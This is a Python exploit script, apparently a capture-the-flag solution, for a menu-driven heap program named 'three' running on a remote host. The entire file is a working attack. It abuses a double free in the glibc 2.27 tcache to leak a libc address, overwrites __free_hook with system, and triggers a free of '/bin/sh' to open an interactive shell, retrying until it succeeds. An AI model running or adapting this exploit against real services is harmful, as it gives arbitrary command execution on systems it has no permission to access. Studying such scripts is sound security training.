#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './three'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'39.96.13.122', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc

#==========

def attack(conn):
    th = Three(conn)

    th.new('a'*8)               # 0
    th.new('b'*0x38+p64(0x11))  # 1
    th.delete(1)

    th.delete(0, False)
    th.delete(0, False)
    th.edit(0, chr(0x50))

    th.new('a'*8)               # 1
    th.new('x'*8)               # 2
    th.delete(0)

    th.edit(2, p64(0)+p64(0x91))
    for _ in range(8):
        th.delete(1, False)

    th.edit(1, '\x88\x87')      # libc partial

    th.new('a'*8)               # 0
    th.edit(2, p64(0)+p64(0x61))
    th.delete(0)

    th.new('\xff')              # 0
    conn.recv(5)
    libc.address =  u64(conn.recv(8)) - 0x3ed8c0
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    th.edit(2, p64(0)+p64(0x51))
    th.delete(1)
    th.edit(2, '/bin/sh\x00'+p64(0x61)+p64(addr_libc_free_hook))
    th.new('a'*8)                   # 1
    th.delete(1)
    th.new(p64(addr_libc_system))   # 1
    conn.sendlineafter('choice:', '3')
    conn.sendlineafter('idx:', '2')
    
class Three:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, data):
        self.sendlineafter('choice:', '1')
        self.sendafter('content:', data[:0x40])

    def edit(self, idx, data):
        self.sendlineafter('choice:', '2')
        self.sendlineafter('idx:', str(idx))
        self.sendafter('content:', data[:0x40])

    def delete(self, idx, clear=True):
        self.sendlineafter('choice:', '3')
        self.sendlineafter('idx:', str(idx))
        self.sendlineafter('(y/n):', 'y' if clear else 'n')

#==========

if __name__=='__main__':
    while True:
        conn = communicate(env.mode, **env.target)
        try:
            attack(conn)
        except:
            conn.close()
            if env.check('debug'):
                break
            else:
                continue
        else:
            break
    conn.interactive()
    
#==========
